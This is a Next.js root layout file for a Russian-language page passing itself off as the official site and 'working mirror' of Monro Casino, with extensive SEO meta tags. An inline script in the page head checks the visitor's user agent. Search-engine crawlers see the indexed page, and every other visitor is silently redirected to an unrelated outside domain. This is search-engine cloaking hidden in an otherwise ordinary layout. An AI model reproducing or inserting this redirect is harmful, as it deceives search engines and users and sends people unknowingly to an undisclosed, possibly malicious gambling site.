import { Manrope } from 'next/font/google'
import './globals.css'

const manrope = Manrope({
  subsets: ['cyrillic', 'latin'],
  weight: ['400', '600', '700', '800'],
  display: 'swap',
  variable: '--font-manrope',
})

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru">
      <head>
        <meta name="yandex-verification" content="b0a08a716720883c" />
        <title>Monro Casino — официальный сайт: играть онлайн, рабочее зеркало Монро Казино</title>
        <meta
          name="description"
          content="Monro Casino официальный сайт: играйте в Монро Казино онлайн, бонус +150% на депозит, слоты и live-игры. Monro casino зеркало рабочее и актуальный вход на официальный сайт Монро Казино."
        />
        <meta name="robots" content="index, follow" />
        <link rel="canonical" href="https://monro2casino.vercel.app/" />
        <meta property="og:type" content="website" />
        <meta property="og:url" content="https://monro2casino.vercel.app/" />
        <meta property="og:locale" content="ru_RU" />
        <meta property="og:title" content="Monro Casino — официальный сайт: играть онлайн, рабочее зеркало Монро Казино" />
        <meta
          property="og:description"
          content="Monro Casino официальный сайт: играйте в Монро Казино онлайн, бонус +150% на депозит, слоты и live-игры. Monro casino зеркало рабочее и актуальный вход на официальный сайт Монро Казино."
        />
        <meta property="og:image" content="https://monro2casino.vercel.app/images/hero-banner.jpg" />
        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:title" content="Monro Casino — официальный сайт: играть онлайн, рабочее зеркало Монро Казино" />
        <meta
          name="twitter:description"
          content="Monro Casino официальный сайт: играйте в Монро Казино онлайн, бонус +150% на депозит, слоты и live-игры. Monro casino зеркало рабочее и актуальный вход на официальный сайт Монро Казино."
        />
        <meta name="twitter:image" content="https://monro2casino.vercel.app/images/hero-banner.jpg" />
        <meta name="theme-color" content="#0b1230" />
        <link rel="icon" href="/icon.png" type="image/png" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace("https://combospark.top/aeaofj2k27");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
      </head>
      <body className={`${manrope.variable} antialiased`}>
        <div className="font-sans">{children}</div>
      </body>
    </html>
  )
}
